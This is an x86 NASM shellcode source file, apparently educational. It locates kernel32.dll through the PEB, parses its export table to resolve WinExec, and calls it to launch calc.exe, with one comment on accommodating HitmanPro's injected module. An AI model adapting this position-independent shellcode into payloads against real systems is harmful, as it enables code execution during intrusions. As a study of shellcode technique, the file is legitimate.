global start

; custom shellcode to locate and call a arbitrary WinAPI-function in Kernel32.dll 
; non-optimized but therefore comprehensible ^^

section .text

start:
    push ebp
    mov ebp,esp
    xor edx,edx
    push edx
    sub esp,0x08
    mov [esp+4],dword 0x636578 
    mov [esp],dword 0x456e6957

    ; find Base address Kernel32.dll    
    mov edx,[fs:edx+0x30]   ; address from PEB (Process Environment Block)
    mov edx,[edx+0x0C]      ; PED_LDR_STRUCT
    ;typedef struct _PEB_LDR_DATA {
        ;  ULONG                   Length;
        ;  BOOLEAN                 Initialized;
        ;  PVOID                   SsHandle;
        ;  LIST_ENTRY              InLoadOrderModuleList;
        ;  LIST_ENTRY              InMemoryOrderModuleList;
        ;  LIST_ENTRY              InInitializationOrderModuleList;
    ;} PEB_LDR_DATA, *PPEB_LDR_DATA;

    mov edx,[edx+0x14]      ; InMemoryOrderModuleList
    ; Step through module list (first: ntdll.dll, module order is not predictable! --> for example: Sophos exploit mitigation insert hmpalert.dll as second module in user process (HitmanPro)
    ; InMemoryOrderModuleList-Struct: offset 0x28 point to dll file name as UNICODE (ToDo: compare dll name)
    mov edx,[edx]           ; InMemoryOrderModule List ntdll.dll
    mov edx,[edx]           ; hmpalert.dll --> delete the line on windows without HitmanPro
    mov edx,[edx]           ; kernel32.dll
    mov ecx,[edx+0x10]      ; Kernel32.dll  base address
    push ecx                ; Base address [EBX+12]
    mov ebx,[esp]           ; Save base address in register EBX 

    ; Parse PE File (helpful: PEView)
    mov edx,[ecx+0x3C]      ; Base address + RVA from New EXE Header
    add ecx,edx             ; Base address + RVA = PE SIGNATURE
    push ecx                
    mov edx,[ecx+0x78]      ; RVA IMAGE_EXPORT_DIRECTORY (== called EXPORT TABLE)
    mov ecx,ebx             ; Base Address
    add ecx,edx
    push ecx                ; Save IMAGE_EXPORT_DIRECTORY

    mov edx,[ecx+0x14]      ; Number of functions
    push edx

    mov eax,ebx             ; Load Base address
    mov edx,[ecx+0x1C]      ; RVA Export Address Table
    add eax,edx
    push eax                ; Absolute address: EXPORT Address Table
    
    mov eax,ebx             ; Load Base address
    mov edx,[ecx+0x20]      ; RVA Export Name Pointer Table
    add eax,edx
    push eax                ; Absolute address: EXPORT Name Pointer Table

    mov eax,ebx             ; Load Base address
    mov edx,[ecx+0x24]      ; RVA Export Ordinal Table 
    add eax,edx
    push eax                ; Absolute address: EXPORT Ordinal Table

    ; Looking for absolute address for arbitrary WINAPI-Function 
    ; First: Step through Name Pointer Table to find point to our WinAPI name (example: "WinExec") 
    xor eax,eax
    mov edx,[esp+4]         ; Start address from Name Pointer Table ==> RVA from first WinAPI name 

loop:
    add edx,4               ; Next entry in Name Pointer Table ==> RVA from second WinAPI name 
    inc eax                 ; Loop counter

    lea esi,[ebp-0xc]       ; load pointer to "WinExec" string into ESI (our arbitrary function name)

    mov ebx,[ebp-0x10]      ; calculate and load string address B to EDI
    add ebx,[edx]           ; Absoulte address from WinAPI name 
    mov edi,ebx             ; load pointer to function name into EDI

    ; Comparing ESI and EDI
    cld                     ; Compare in forward direction
    xor ecx,ecx             ; clear register
    add ecx,8               ; Compare 8 Byte
    repe cmpsb              ; Compare esi and edi (Comparing string: https://www.aldeid.com/wiki/X86-assembly/Instructions/cmpsb)
    jne loop

    ; Load RVA from WinAPI function
    ; EAX contains the position from our WinAPI name in Name Pointer Table (for example: WinExec is the 0x5F9th entry)
    xor ebx,ebx
    mov ecx,[esp]           ; Absolute address from Ordinal table ==> 2 Byte per position --> not 4 byte
    mov bx,[ecx+eax*2]      ; ECX holds the position in Address Table

    mov edx,[esp+8]         ; Absolute address from Address Table
    mov edx,[edx+4*ebx]     ; RVA from our WinAPI function (Entry point from "WinExec")

    mov ebx,[ebp-0x10]      ; Base address
    add ebx,edx             ; EBX holds the WinAPI function entry point!

    ; Call WinExec function 
    ;UINT WinExec(
    ;    LPCSTR lpCmdLine,
    ;    UINT   uCmdShow
    ;);

    xor edx,edx
    ;push second argument to stack
    push 10    
    ;push first argument to stack
    push edx
    push 0x6578652e
    push 0x636c6163
    push esp
    ;call function
    call ebx
    ; cleaning stack
    mov esp,ebp
    pop ebp
    retn
